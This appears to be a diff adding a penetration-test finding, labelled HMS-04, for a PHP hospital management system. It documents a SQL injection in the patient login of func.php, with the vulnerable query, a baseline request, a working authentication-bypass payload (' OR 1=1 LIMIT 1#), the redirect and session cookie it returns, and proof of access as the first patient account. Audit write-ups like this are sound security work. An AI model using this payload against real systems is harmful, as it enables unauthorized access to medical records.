@@ -1,0 +1,12 @@
+HMS-04: Unauthenticated patient login SQL injection -> auth bypass as first patreg row
+Sink: func.php:8-10  "select * from patreg where email='$email' and password='$password';"
+Entry: POST /func.php (patsub=1, email, password2); flat layout, func.php directly reachable.
+
+    baseline: POST /func.php  patsub=1&email=nonexistent@x.c&password2=wrong
+              -> HTTP 200 in 0.009s (JS alert 'Invalid Username or Password')
+    payload:  POST /func.php  patsub=1&email=%27+OR+1%3D1+LIMIT+1%23&password2=x
+              (decodes to: email=' OR 1=1 LIMIT 1#)
+              -> HTTP 302, Location: admin-panel.php, Set-Cookie: PHPSESSID=84cd...
+    Session proof: GET /admin-panel.php with that cookie renders
+              "Welcome <REDACTED>"  (= first patreg row, pid=1, password <REDACTED> - plaintext seed credential, 6 chars alphanumeric, matches account in local DB)
+    LIMIT 1 guarantees mysqli_num_rows==1 which the handler requires.
